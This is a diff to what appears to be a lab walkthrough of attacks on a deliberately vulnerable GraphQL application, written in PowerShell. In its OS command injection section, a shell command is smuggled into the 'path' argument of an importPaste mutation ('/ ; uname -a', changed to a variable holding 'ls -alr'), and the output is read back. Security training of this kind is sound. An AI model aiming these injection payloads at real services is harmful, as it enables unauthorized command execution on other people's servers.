@@ -187,16 +187,19 @@ Invoke-GraphQLQuery -Mutation $requestForgeryMutation -Uri $gqlEndpointUri -Raw
 
 ## Code Execution :: OS Command Injection #1
 ```powershell
+$commandToInject = "ls -alr"
+
 $commandInjectionMutation = '
 mutation  {
-      importPaste(host:"localhost", port:80, path:"/ ; uname -a", scheme:"http"){
+      importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
         result
       }
     }
 '
 
-Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri -Raw
+$result = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri 
 
+$result.data.importPaste.result
 ```
 
 
